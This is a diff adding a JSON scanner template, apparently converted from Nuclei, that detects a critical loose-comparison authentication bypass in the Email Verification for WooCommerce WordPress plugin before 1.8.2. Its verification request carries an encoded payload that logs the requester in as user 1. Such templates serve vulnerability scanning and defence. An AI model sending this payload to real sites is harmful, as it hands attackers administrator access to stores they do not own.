@@ -1,0 +1,174 @@
+{
+  "id": "wp-woocommerce-email-verification",
+  "name": "Email Verification for WooCommerce \u003c 1.8.2 - Loose Comparison to Authentication Bypass",
+  "author": "random_robbie,daffianfo",
+  "severity": "CRITICAL",
+  "description": "Email Verification for WooCommerce Wordpress plugin prior to version 1.8.2  contains a loose comparison issue which could allow any user to log in as administrator.\n",
+  "references": [
+    "https://wpvulndb.com/vulnerabilities/10318",
+    "https://wpscan.com/vulnerability/0c93832c-83db-4053-8a11-70de966bb3a8"
+  ],
+  "tags": [
+    "woocommerce",
+    "wp",
+    "wpscan",
+    "wordpress",
+    "wp-plugin"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-288",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/my-account/?alg_wc_ev_verify_email\u003deyJpZCI6MSwiY29kZSI6MH0\u003d",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "header",
+          "values": [
+            "wordpress_logged_in_[a-z0-9]{32}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "Your account has been activated!",
+            "From your account dashboard you can view your"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wp-woocommerce-email-verification",
+    "info": {
+      "name": "Email Verification for WooCommerce \u003c 1.8.2 - Loose Comparison to Authentication Bypass",
+      "author": "random_robbie,daffianfo",
+      "severity": "critical",
+      "description": "Email Verification for WooCommerce Wordpress plugin prior to version 1.8.2  contains a loose comparison issue which could allow any user to log in as administrator.\n",
+      "reference": [
+        "https://wpvulndb.com/vulnerabilities/10318",
+        "https://wpscan.com/vulnerability/0c93832c-83db-4053-8a11-70de966bb3a8"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-288"
+      },
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "woocommerce,wp,wpscan,wordpress,wp-plugin"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/my-account/?alg_wc_ev_verify_email\u003deyJpZCI6MSwiY29kZSI6MH0\u003d",
+          "{{BaseURL}}/?alg_wc_ev_verify_email\u003deyJpZCI6MSwiY29kZSI6MH0\u003d"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "header",
+            "regex": [
+              "wordpress_logged_in_[a-z0-9]{32}"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "Your account has been activated!",
+              "From your account dashboard you can view your"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
